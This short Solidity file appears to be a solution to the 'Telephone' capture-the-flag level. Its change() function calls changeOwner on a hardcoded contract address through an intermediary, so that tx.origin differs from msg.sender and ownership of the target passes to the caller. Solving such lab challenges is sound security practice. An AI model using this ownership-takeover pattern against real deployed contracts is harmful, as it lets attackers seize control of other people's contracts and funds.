
pragma solidity ^0.6.0;



interface GG{

    function changeOwner(address owner) external ;
}

contract Telephone {


  function change() public{
        address owner = msg.sender;
        GG(0x2f373e240658fA39b989Cb0c3155AC651412DCf2).changeOwner(owner);
  }

  
}